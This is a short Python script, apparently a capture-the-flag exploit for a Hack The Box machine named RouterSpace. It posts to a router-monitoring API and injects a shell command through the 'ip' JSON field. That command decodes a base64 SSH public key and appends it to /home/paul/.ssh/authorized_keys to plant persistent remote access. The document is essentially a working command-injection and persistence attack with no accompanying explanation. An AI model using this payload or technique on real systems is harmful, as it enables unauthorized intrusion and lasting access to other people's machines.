import requests

headers = {
'accept':'application/json, text/plain, */*',
'user-agent':'RouterSpaceAgent',
'Content-Type':'application/json',
'Host':'routerspace.htb'
}

url = "http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess"

data = """{"ip":";echo -n 'c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDelRmMEV3L1lTYU1uaThiYVNhQkNtSXNVQnVvaUJac1o4TW96aHQxUExGUG5oUE1aaERLdHB5VDMxdVNrUG8vWUZvYVpJc0h3Ny9XNDQvcEl6YUNnVG9YVlJORlFjVmJWZ3dMSHBjbS81NjI5aTROSnh0cDRPTERpQTdkMHE5R25DenpsM01vQkZMZkppUDR3dzAvSjljZVhtUlFoS1JLc0xCdFdvK25NdEVjMm1ocDVvb1IvdjJtajhld1RCb0hhWmVyZCtJRlJlcnFzNy9qcTFPdFc5azBVOG5yTk92UzRCUVl2U3phb0ROT3dXUk5QZnVZTXNSOW1zL3ZweDVVWXZtcDRBa05acjFHWnlVWHVHY0IyT3Z4eTRVQ3ppSFFVTitzSDVsYlNIdmRENWhQdzNkTjBwd2gzYUZFT00zcXVjWStYcmNCWDIvUFV5U1pleXhqQk5EYnlqNzlodnV2ekZYc3VGWnc2c1JOOWZGbklTbmlLQkdzNGlKM2NSeUxUQllsQXhuanNxSU1mcUhid3lmNGM4RWhpaDdmYzV0cUxmbU8wQjBjZVkwRTFZblVoeldkQ25mK1JzVEdRSFlhMmE4YkV0ejc0UnhuWGFBcWt2Mnc4djJ4TXRZZitkMXY2QU95bVRnMXNCaDh1S2ZKK3BpUndIenVJc3ZJWlluUVU9Cg=='| base64 -d >> /home/paul/.ssh/authorized_keys"}"""

response = requests.post(url, data=data, headers=headers).text
if response.replace("\\n","").replace('"',"") == "":
    print("SUCCESS")
else:
    print("FAILED")

